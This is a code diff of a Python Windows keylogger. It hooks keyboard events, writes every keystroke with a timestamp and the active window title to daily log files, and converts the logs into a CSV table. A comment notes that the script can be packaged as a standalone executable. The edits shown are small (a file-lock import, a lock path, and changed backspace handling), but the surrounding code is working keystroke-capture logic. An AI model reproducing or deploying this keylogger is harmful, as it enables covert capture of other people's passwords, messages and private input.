@@ -9,8 +9,17 @@ import pythoncom
 from datetime import datetime
 import pandas as pd
 import win32gui
+import os
+import zipfile
 
-# To get this into a exe. Use pyinstaller --onefile  -F main23.py
+
+from filelock import Timeout, FileLock
+
+
+
+
+
+# To get this into a exe. use pyinstaller --onefile  -F main23.py
 
 global pathforlogs
 global pathforlogsbackup
@@ -40,6 +49,7 @@ def converttotable():
   try:
     df = pd.read_csv(f, sep='|', encoding="ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"])
     df.to_csv(locationofFileandNameForLogsTable, index=None, )
+
   except PermissionError:
     print("User has opened the table file, they still have it opened. Which means we cannot open it.  ")
     print("They need to close the file or we cannot access it. ")
@@ -87,9 +97,10 @@ def OnKeyboardEvent(event):
   print("The current working directory is %s" % path)
 
   LocationofFileandName = os.path.join(pathforlogs, datelogname + "-logfile.txt")
+  LocationofFileandNameLockfile = os.path.join(pathforlogs, datelogname + "-logfile.txt.lock")
 
-  logfile = open(LocationofFileandName,
-                 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
+
+  logfile = open(LocationofFileandName, 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
   buffers = logfile.read()
 
   logfile.close()
@@ -129,11 +140,16 @@ def OnKeyboardEvent(event):
       logfile2.close()
       print("the window has  changed")
 
+
+
   if event.Ascii == 13:  # if entered is pressed, then start a new line, add datetimestamp, windowname and delimter
     keylogs = '\n' + datetimestamp + "|" + currentwindow + "|" + " "
 
+  # if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
+    # keylogs = ' <Backspace> '
+
   if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
-    keylogs = ' <Backspace> '
+    keylogs = ''
 
   if event.Ascii == 9:
     keylogs = ' <Tab> '
@@ -143,11 +159,15 @@ def OnKeyboardEvent(event):
   buffers += keylogs  # Whatever is keylogs equal to, Gets added to the buffers variable.
   NewLineIfWindowChanges()
 
+
   logfile.write(buffers)  # writes the key pressed  to the file
 
   logfile.close()  # closes the file
   converttotable()
   return True
+
+
+
 
 
 def main():
